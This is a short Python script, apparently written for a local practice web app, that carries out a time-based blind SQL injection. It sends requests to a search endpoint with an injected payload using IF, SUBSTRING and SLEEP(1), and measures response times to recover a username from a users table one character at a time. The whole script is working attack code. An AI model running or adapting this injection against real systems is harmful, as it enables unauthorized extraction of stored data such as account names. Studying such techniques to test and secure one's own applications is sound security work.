import requests as r
import time

charset = list('abcdefghijklmnopqrstuvwxyz0123456789_')
username = list()
for i in range(1, 20):
	for char in charset:
		url = f'http://127.0.0.1:5000/search_time_based?q=a%27%20OR%20IF(SUBSTRING((SELECT%20username%20FROM%20users%20order%20by%20id%20limit%200,1),%20{i},%201)%20=%20%27{char}%27,%20SLEEP(1),%200)%20%23'
		init_time = time.time()
		response = r.get(url=url)
		end_time = time.time()
		elapsed_time = end_time - init_time
		if elapsed_time > 1:
			print(f"Valid character found! -> {char}")
			username.append(char)
